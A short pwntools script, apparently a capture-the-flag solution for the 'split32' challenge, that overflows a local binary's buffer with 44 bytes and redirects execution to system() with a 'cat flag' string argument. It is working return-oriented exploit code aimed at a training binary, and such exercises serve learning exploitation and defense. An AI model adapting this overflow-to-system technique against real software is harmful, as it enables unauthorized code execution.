from pwn import *

payld =  "A"*44
payld += p32(0x08048430) # system
payld += "AAAA"
payld += p32(0x804a030) # cat flag string
#payld += p32(0x00001030) # cat flag string
#p = gdb.debug("./split32","b *0x08048648")
p = process("./split32")
context.log_level = "DEBUG"
p.recvuntil("> ")
p.sendline(payld)
p.interactive()
